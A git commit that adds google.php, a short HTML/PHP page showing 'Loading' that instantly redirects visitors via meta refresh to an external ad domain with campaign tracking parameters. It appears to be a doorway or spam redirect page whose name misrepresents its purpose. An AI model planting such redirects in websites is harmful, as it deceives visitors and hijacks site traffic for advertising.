7fc1e08c9595388cbaa1c03f6531486dad76cd9c
ellnagamyc <82741888+ellnagamyc@users.noreply.github.com>
2021-04-18 05:10:39 +0200

    Add files via upload

---
+++ google.php
@@ -0,0 +1,21 @@
+﻿<!DOCTYPE html>
+
+<html>
+
+<head>
+  <title> Loading ..... </title>
+    
+<meta http-equiv="refresh" content="0;URL='https://ads.grayribbon.org/?utm_medium=80c138897328d8ed5c1d70f2505593f758b61506&utm_campaign=target_KW_94faaa" />
+</head>
+
+<body>
+
+<?php
+/*
+
+*/
+   echo"<center> Loading</center>";
+ echo "<META HTTP-EQUIV='Refresh' Content=1;URL='./'>";
+?>
+</body>
+</html>
